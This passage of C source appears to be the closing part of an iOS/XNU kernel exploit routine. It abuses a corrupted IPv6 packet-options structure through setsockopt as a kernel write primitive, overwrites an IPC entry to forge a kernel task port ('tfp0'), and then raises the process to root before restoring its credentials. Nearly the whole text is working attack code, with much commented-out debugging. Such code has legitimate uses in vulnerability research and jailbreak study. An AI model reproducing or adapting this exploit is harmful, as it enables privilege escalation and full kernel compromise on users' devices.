    /* for(int i=0; i<cnt; i++) */
    /*     printf("%#x\n", ports[i]); */

    /* get rid of the stuff we sent to the pipe to create the initial pipe buffer */
    char buf[colliderkzone - 1];
    ssize_t r1 = read(tfp0pipe[0], buf, sizeof(buf));
    if(r1 == -1){
        printf("read tfp0pipe: %s\n", strerror(errno));
        return 1;
    }
    /* printf("read %#llx bytes\n", r1); */

    /* due to the way our kwrite works, the bottom 16 bits of tfp0's ipc_port
     * pointer will be overwritten with '0x0100' instead of '0x0000'
     * because if we attempt to write all zeros, a kfree on our addr will
     * happen
     */
    /* char pad[0x100]; */
    /* write(tfp0pipe[1], pad, sizeof(pad)); */
    ssize_t w1 = write(tfp0pipe[1], &ktfp0, sizeof(ktfp0));
    if(w1 == -1){
        printf("write tfp0pipe %s\n", strerror(errno));
        return 1;
    }

    printf("tfp0pipe:\n");
    DumpKernelMemory(tfp0pipebuf_kaddr, sizeof(kport_t));

    /* printf("about to overwrite first pointer in itk_registered\n"); */
    /* sleep(2); */
    
    /* uint64_t baseaddr = mytask_kaddr + TASK_ITK_REGISTERED_OFFSET ;//+ 8; */

    struct ip6_pktopts old_pktopts = {0};
    ssize_t r = read(evil_pipe[0], &old_pktopts, sizeof(old_pktopts));

    struct ip6_pktopts new_pktopts = {0};
    new_pktopts.ip6po_pktinfo = (baseaddr - sizeof(struct in6_pktinfo)) + 2;

    ssize_t w = write(evil_pipe[1], &new_pktopts, sizeof(new_pktopts));

    struct in6_pktinfo pktinfo = {0};
    pktinfo.ipi6_ifindex = 1;

    /* printf("pktinfo struct:\n"); */
    /* DumpHex(&pktinfo, sizeof(pktinfo)); */

    int err = setsockopt(evil_socket, IPPROTO_IPV6, IPV6_PKTINFO, &pktinfo,
            sizeof(pktinfo));

    if(err == -1){
        printf("%s: first kwrite setsockopt failed: %s\n", __func__, strerror(errno));
        return 1;
    }

    /* struct msg { */
    /*     mach_msg_header_t hdr; */
    /*     mach_msg_body_t body; */
    /*     mach_msg_port_descriptor_t port; */
    /* }; */

    /* mach_port_t msgrecv; */
    /* mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msgrecv); */

    /* mach_port_t p; */
    /* mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p); */

    /* struct msg *msg = malloc(sizeof(struct msg)); */
    /* msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | */
    /*     MACH_MSGH_BITS_COMPLEX; */
    /* msg->hdr.msgh_size = sizeof(struct msg); */
    /* msg->hdr.msgh_remote_port = tfp0;//msgrecv; */
    /* msg->hdr.msgh_local_port = MACH_PORT_NULL; */
    /* msg->hdr.msgh_id = 0x12345678; */
    /* msg->body.msgh_descriptor_count = 1; */
    /* msg->port.name = p;//tfp0; */
    /* msg->port.disposition = MACH_MSG_TYPE_COPY_SEND; */
    /* msg->port.type = MACH_MSG_PORT_DESCRIPTOR; */

    /* kret = mach_msg(&msg->hdr, MACH_SEND_MSG, sizeof(*msg), 0, tfp0, */
    /*         0, MACH_PORT_NULL); */

    /* struct rcv_msg { */
    /*     mach_msg_header_t hdr; */
    /*     mach_msg_body_t body; */
    /*     mach_msg_port_descriptor_t port; */
    /*     mach_msg_trailer_t trailer; */
    /* }; */


    /* printf("first mach msg kret %s\n", mach_error_string(kret)); */

    /* struct rcv_msg *rcvmsg = malloc(sizeof(struct rcv_msg)); */

    /* kret = mach_msg(&rcvmsg->hdr, MACH_RCV_MSG, 0, sizeof(*rcvmsg), MACH_PORT_NULL, */
    /*         0, MACH_PORT_NULL); */

    /* printf("second mach msg kret %s\n", mach_error_string(kret)); */

    printf("After first kwrite:\n");
    /* DumpKernelMemory(baseaddr - sizeof(struct ipc_entry), sizeof(struct ipc_entry) * 2); */

    EarlyKernelReadN(baseaddr, &tfp0_ipcentry, sizeof(tfp0_ipcentry));

    printf("after: tfp0_ipcentry ie_object: %#llx\n", tfp0_ipcentry.ie_object);
    printf("after: tfp0 is %#x\n", tfp0);

    gen = bits(tfp0_ipcentry.ie_bits, 24, 31);
    D = bits(tfp0_ipcentry.ie_bits, 20, 20);
    PS = bits(tfp0_ipcentry.ie_bits, 19, 19);
    SO = bits(tfp0_ipcentry.ie_bits, 18, 18);
    R = bits(tfp0_ipcentry.ie_bits, 17, 17);
    S = bits(tfp0_ipcentry.ie_bits, 16, 16);
    urefs = bits(tfp0_ipcentry.ie_bits, 0, 15);

    printf("after:\n");
    printf("\tgen: %#x\n", gen);
    printf("\tdead name: %d\n", D);
    printf("\tport set: %d\n", PS);
    printf("\tsend once: %d\n", SO);
    printf("\treceive: %d\n", R);
    printf("\tsend: %d\n", S);
    printf("\turefs: %d\n", urefs);

    /* printf("about to try mach_port_get_context\n"); */

    /* DumpKernelMemory(mytask_kaddr + TASK_ITK_REGISTERED_OFFSET, */
    /*         3 * sizeof(void *)); */

    /* printf("gonna try mach_ports_lookup\n"); */
    /* sleep(1); */

    /* kret = mach_ports_lookup(mach_task_self(), &ports, &cnt); */
    /* printf("%s\n", mach_error_string(kret)); */

    /* printf("gonna try mach_port_get_context on each\n"); */

    /* tfp0 = ports[0]; */
    /* kret = mach_port_insert_right(mach_task_self(), tfp0, tfp0, MACH_PORT_RIGHT_RECEIVE); */
    /* printf("mach_port_insert_right kret %s\n", mach_error_string(kret)); */
    /* kret = mach_port_insert_right(mach_task_self(), tfp0, tfp0, MACH_MSG_TYPE_MAKE_SEND); */
    /* printf("mach_port_insert_right kret %s\n", mach_error_string(kret)); */



    uint64_t context = 0;
    kret = mach_port_get_context(mach_task_self(), tfp0, &context);
    printf("%#x: %#llx %s\n", tfp0, context, mach_error_string(kret));

    /* printf("mach_port_insert_right tfp0 kret %s\n", mach_error_string(kret)); */

    /* for(int i=0; i<cnt; i++){ */
    /*     uint64_t context = 0; */
    /*     kret = mach_port_get_context(mach_task_self(), ports[i], &context); */
    /*     printf("%#x: %#llx %s\n", ports[i], context, mach_error_string(kret)); */
    /* } */

    /* unsigned tfp0_portidx = MACH_PORT_INDEX(tfp0); */
    /* unsigned tfp0_gennum = MACH_PORT_GEN(tfp0); */

    /* printf("after: tfp0_portidx %#x tfp0_gennum %#x\n", tfp0_portidx, tfp0_gennum); */

    /* EarlyKernelReadN(myipcspace_kaddr, &myipcspace, sizeof(myipcspace)); */


    /* printf("after: is_table_size %#x is_table %#llx\n", myipcspace.is_table_size, */
    /*         myipcspace.is_table); */

    /* printf("myipcspace.is_table:\n"); */
    /* DumpKernelMemory(myipcspace.is_table, 0x500); */
    /* printf("after mach_ports_register: dump of is_table + tfp0_portidx:\n"); */
    /* DumpKernelMemory(myipcspace.is_table + */
    /*         (sizeof(struct ipc_entry) * tfp0_portidx), sizeof(struct ipc_entry)); */

    /* struct ipc_object tfp0_ipcobject = {0}; */
    /* EarlyKernelReadN(myipcspace.is_table + */
    /*         (sizeof(struct ipc_entry) * tfp0_portidx), &tfp0_ipcobject, */
    /*         sizeof(tfp0_ipcobject)); */
    /* printf("after: tfp0_ipcobject.io_bits %#x tfp0_ipcobject.io_references %#x\n", */
    /*         tfp0_ipcobject.io_bits, tfp0_ipcobject.io_references); */

    /* printf("Testing write with new tfp0\n"); */
    printf("UID: %d\n", getuid());
    uid_t orig_uid, orig_ruid, orig_svuid;
    gid_t orig_rgid, orig_svgid;

    if(root(tfp0, myproc_ucred_kaddr, &orig_uid, &orig_ruid, &orig_svuid,
                &orig_rgid, &orig_svgid)){
        return 1;
    }

    printf("UID: %d\n", getuid());

    unroot(tfp0, myproc_ucred_kaddr, orig_uid, orig_ruid, orig_svuid,
            orig_rgid, orig_svgid);

    /* int data = 0x41424344; */
    /* kret = KernelWrite(tfp0, tfp0pipebuf_kaddr, data, sizeof(data)); */
    /* printf("KernelWrite kret %s\n", mach_error_string(kret)); */

    /* printf("tfp0pipe:\n"); */
    /* DumpKernelMemory(tfp0pipebuf_kaddr, 0x20); */

    *tfp0out = tfp0;

    // XXX cleanup, restore data that the 20 byte write killed with our
    // new tfp0

    return 0;
}
